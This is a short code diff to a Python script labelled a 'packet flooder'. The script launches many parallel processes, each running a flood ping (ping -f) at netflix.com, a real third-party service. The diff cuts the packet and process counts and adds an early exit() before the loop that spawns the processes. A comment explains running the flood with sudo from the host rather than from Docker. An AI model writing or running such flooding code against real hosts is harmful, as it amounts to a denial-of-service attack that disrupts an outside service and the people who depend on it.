@@ -11,12 +11,12 @@ print("Running packet flooder")
 #increase later
 def pinger():
 	#add sudo -S before ping if want to run host rather than docker
-	os.system("ping -f netflix.com -c 15000")
+	os.system("ping -f netflix.com -c 1500")
 
 parent_process=multiprocessing.Process(target=pinger)
 parent_process.start()
-
-for x in range(44):
+exit()
+for x in range(24):
 	temp_process=multiprocessing.Process(target=pinger)
 	temp_process.start()
 	if(x%4==0):
